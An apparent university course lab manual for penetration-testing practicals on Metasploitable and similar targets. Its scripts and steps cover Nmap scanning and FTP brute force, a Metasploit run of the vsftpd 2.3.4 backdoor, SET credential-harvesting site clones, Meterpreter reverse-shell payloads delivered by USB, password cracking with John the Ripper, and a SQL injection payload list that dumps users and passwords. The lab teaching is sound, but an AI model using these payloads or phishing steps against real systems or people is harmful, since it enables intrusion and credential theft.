---
tags:
  - int245
  - practicals
  - lab
  - pentest
aliases:
  - INT245 Lab Manual
---

# 💻 INT245 Practicals and Labs Guide

<- Back to [[INT245_Dashboard|Master Dashboard]]

> [!important] Disclaimer
> These practicals are intended for educational purposes and should only be performed on authorized environments (e.g., Metasploitable, TryHackMe, or local lab setups).

---

## 1. Nmap Network Scanning & Enumeration
Nmap is utilized to map out the network, find open ports, and enumerate services running on those ports.


```bash
#!/bin/bash
# Nmap Network Scanning & Enumeration

if [ -z "$1" ]; then
    echo "Usage: ./1_nmap_scans.sh <target_ip>"
    exit 1
fi

TARGET=$1
echo "======================================"
echo " Nmap Scanning for $TARGET"
echo "======================================"

echo "[*] Running Service Version Detection (-sV)..."
nmap -sV $TARGET

echo ""
echo "[*] Running OS Detection (-O)... (requires sudo)"
sudo nmap -O $TARGET

echo ""
echo "[*] Running Nmap Default Scripts (-sC)..."
nmap -sC $TARGET

echo ""
echo "[*] Scans complete!"
```

### Basic Scans
- **Service Version Detection:** `nmap -sV <target_ip>`
- **OS Detection:** `nmap -O <target_ip>`
- **Protocol Scan:** `sudo nmap -sO <target_ip>` (checks supported IP protocols instead of ports).

### Nmap Scripting Engine (NSE)
- **Default Scripts:** `nmap -sC <target_ip>` or `nmap --script=default <target_ip>`
- **Banner Grabbing:** `nmap -sV --script=banner <target_ip>`
- **FTP Anonymous Login Test:** `nmap -p 21 --script=ftp-anon <target_ip>`
- **FTP Brute Force:** `nmap -p 21 --script ftp-brute --script-args userdb=users.txt,passdb=rockyou.txt <target_ip>`

---

## 2. Exploiting vsftpd 2.3.4 (Metasploitable 2)
A classic lab demonstrating how to use the Metasploit Framework to exploit a known vulnerability in an FTP daemon.


```ruby
# Metasploit Resource Script for vsftpd 2.3.4
# Run with: msfconsole -r 2_vsftpd_exploit.rc
# Set the TARGET_IP environment variable before running, or edit this file manually.

<ruby>
run_single("use exploit/unix/ftp/vsftpd_234_backdoor")
if ENV['TARGET_IP']
  run_single("set RHOSTS #{ENV['TARGET_IP']}")
  print_line("[*] Target set to #{ENV['TARGET_IP']}")
  run_single("exploit")
else
  print_error("Please set TARGET_IP environment variable before running this script.")
  print_error("Example: TARGET_IP=192.168.1.100 msfconsole -r 2_vsftpd_exploit.rc")
end
</ruby>
```

### Steps:
1. **Identify the target service:** `nmap -sV <target_ip>` (Look for `vsftpd 2.3.4` on port 21).
2. **Start Metasploit:** Type `msfconsole`.
3. **Search for exploit:** `search vsftpd`
4. **Select the module:** `use exploit/unix/ftp/vsftpd_234_backdoor`
5. **Configure Payload:** 
   - `show options`
   - `set RHOSTS <target_ip>`
6. **Execute:** `exploit`
7. **Verify Access:** Once the shell opens, type `whoami` and `uname -a`.

---

## 3. Social Engineering Toolkit (SET) & Session Hijacking
A lab demonstrating Credential Harvesting, Phishing, and malicious payload generation.


```bash
#!/bin/bash
# Social Engineering Toolkit (SET) - Interactive Helper

echo "=========================================================="
echo " SET Credential Harvesting & Session Hijacking Guide"
echo "=========================================================="
echo "To perform Credential Harvesting with SET, follow these steps:"
echo "1. The setoolkit interface will launch."
echo "2. Select '2' (Website Attack Vectors)"
echo "3. Select '3' (Credential Harvester)"
echo "4. Select '2' (Site Cloner) or '1' (Web Templates)"
echo "5. Enter your Kali IP when prompted for 'IP address for the POST back'."
echo "6. Enter the target URL to clone (e.g., http://testphp.vulnweb.com/login.php)."
echo "7. Wait for victims to connect to your IP, and watch for credentials."
echo ""
echo "Press Enter to launch setoolkit now (requires sudo), or Ctrl+C to cancel."
read

sudo setoolkit
```

### Part A: Credential Harvesting
1. Launch SET: `setoolkit` (as root).
2. Navigate menu: `2` (Website Attack Vectors) -> `3` (Credential Harvester).
3. Choose `2` (Site Cloner) or `1` (Web Templates).
4. Enter Attacker IP (your Kali IP).
5. If using Site Cloner, enter target URL (e.g., `http://testphp.vulnweb.com/login.php`).
6. Victim accesses your IP. SET captures any submitted credentials in plain text.

### Part B: Malicious Payload Generation (USB/PowerShell)
1. In SET, generate a Meterpreter reverse TCP payload.
2. Provide `LHOST` (Kali IP) and `LPORT` (e.g., 4455).
3. Deploy payload via a cloned HTTP server (`python -m http.server`) or infectious media (USB `autorun.inf`).
4. Wait for the reverse connection on `msfconsole` (`multi/handler`).

---

## 4. Password Cracking with John the Ripper
A demonstration of a dictionary attack against Linux shadow hashes.


```bash
#!/bin/bash
# Password Cracking with John the Ripper

if [ -z "$1" ]; then
    echo "Usage: ./4_john_cracker.sh <password_to_hash_and_crack>"
    echo "Example: ./4_john_cracker.sh password123"
    exit 1
fi

PASSWORD=$1
HASH_FILE="/tmp/hashes.txt"
WORDLIST="/usr/share/wordlists/rockyou.txt"

echo "======================================"
echo " John the Ripper Demonstration"
echo "======================================"

echo "[*] Generating SHA-512 hash for password: $PASSWORD"
HASH=$(openssl passwd -6 "$PASSWORD")
echo "$HASH" > "$HASH_FILE"
echo "[*] Hash saved to $HASH_FILE"

if [ ! -f "$WORDLIST" ]; then
    echo "[!] Wordlist $WORDLIST not found!"
    echo "    You may need to unzip rockyou:"
    echo "    sudo gzip -d /usr/share/wordlists/rockyou.txt.gz"
    echo "    Skipping crack attempt."
    rm -f "$HASH_FILE"
    exit 1
fi

echo ""
echo "[*] Running John the Ripper against the hash..."
john --format=sha512crypt --wordlist="$WORDLIST" "$HASH_FILE"

echo ""
echo "[*] Showing cracked passwords:"
john --show "$HASH_FILE"

echo "[*] Cleaning up..."
rm -f "$HASH_FILE"
```

### Steps:
1. **Generate a test hash:** `openssl passwd -6 password123` (Generates an SHA-512 hash).
2. **Save hash to file:** `echo 'hashed_output' > /tmp/hashes.txt`
3. **Run John the Ripper:** 
   `john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt`
4. **View results:** `john --show /tmp/hashes.txt`

---

## 5. OSINT and Reconnaissance
Practical commands to gather intelligence about a target domain or person.


```bash
#!/bin/bash
# OSINT and Reconnaissance Script

if [ -z "$1" ]; then
    echo "Usage: ./5_osint_recon.sh <target_domain>"
    exit 1
fi

DOMAIN=$1

echo "======================================"
echo " DNS Reconnaissance (dig)"
echo "======================================"
echo "[*] Nameservers (NS):"
dig $DOMAIN NS +short
echo ""
echo "[*] Mail Exchange (MX):"
dig $DOMAIN MX +short

echo ""
echo "======================================"
echo " Subdomain Enumeration (subfinder)"
echo "======================================"
if command -v subfinder &> /dev/null; then
    subfinder -d $DOMAIN
else
    echo "[!] subfinder not installed. Skipping..."
fi

echo ""
echo "======================================"
echo " Technology Detection (whatweb)"
echo "======================================"
if command -v whatweb &> /dev/null; then
    whatweb $DOMAIN
else
    echo "[!] whatweb not installed. Skipping..."
fi

echo ""
echo "======================================"
echo " WAF Detection (wafw00f)"
echo "======================================"
if command -v wafw00f &> /dev/null; then
    wafw00f $DOMAIN
else
    echo "[!] wafw00f not installed. Skipping..."
fi
```

- **DNS Reconnaissance (dig & nslookup):**
  - `nslookup` (type `set type=ns` or `set type=mx` then domain).
  - `dig facebook.com NS`
  - `dig axfr comptia.org @<nameserver>` (Attempt Zone Transfer)
- **Subdomain Enumeration:** `subfinder -d target.com`
- **Username Tracking:** `sherlock <username>`
- **Technology Detection:** `whatweb <target_domain>`
- **WAF Detection:** `wafw00f <target_domain>`

---

## 6. SQL Injection (SQLi) Manual Enumeration
Testing input fields for basic SQL injection vulnerabilities.


```python
#!/usr/bin/env python3
# Basic SQLi Manual Enumeration Helper

def generate_payloads():
    payloads = [
        "' OR 1=1 -- -",
        "1' ORDER BY 1 #",
        "1' ORDER BY 2 #",
        "1' UNION SELECT null, database() #",
        "1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() #",
        "1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' #",
        "1' UNION SELECT user, password FROM users #"
    ]
    return payloads

def main():
    print("=========================================")
    print(" SQL Injection Manual Testing Payloads")
    print("=========================================")
    print("Copy and paste these payloads sequentially into vulnerable input fields:\n")
    
    payloads = generate_payloads()
    for i, p in enumerate(payloads, 1):
        print(f"[{i}] {p}")
        
    print("\n[*] To automate this process entirely, run SQLMap:")
    print("    sqlmap -u \"http://target.com/page.php?id=1\" --dbs")

if __name__ == "__main__":
    main()
```

### Steps:
1. **Bypass Login:** `admin' OR 1=1 -- -`
2. **Determine column count:** `1' ORDER BY 1 #` (increment until error).
3. **Find Database Name:** `1' UNION SELECT null, database() #`
4. **Extract Tables:** `1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema='dvwa' #`
5. **Extract Columns:** `1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' #`
6. **Dump Data:** `1' UNION SELECT user, password FROM users #`

---

## 7. Python Network Scanner
Writing a basic ARP scanner using Scapy.


```python
#!/usr/bin/env python3
# Python Network Scanner (ARP)

import sys
try:
    from scapy.all import ARP, Ether, srp
except ImportError:
    print("[!] Scapy is not installed. Run: pip3 install scapy")
    sys.exit(1)

class NetworkScanner:
    def __init__(self, ip_range):
        self.ip_range = ip_range
        self.live_hosts = []

    def scan_network(self):
        print(f"[*] Sending ARP requests to {self.ip_range} ...")
        arp = ARP(pdst=self.ip_range)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp
        result = srp(packet, timeout=3, verbose=0)[0]
        
        for sent, received in result:
            self.live_hosts.append({'ip': received.psrc, 'mac': received.hwsrc})
        return self.live_hosts

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: sudo python3 7_network_scanner.py <ip_range>")
        print("Example: sudo python3 7_network_scanner.py 192.168.1.0/24")
        sys.exit(1)
        
    scanner = NetworkScanner(sys.argv[1])
    devices = scanner.scan_network()
    
    print("\nLive Hosts Found:")
    print("IP Address\t\tMAC Address")
    print("-----------------------------------------")
    for device in devices:
        print(f"{device['ip']}\t\t{device['mac']}")
```
Run with `sudo python3 scanner.py` to identify live hosts on the LAN.
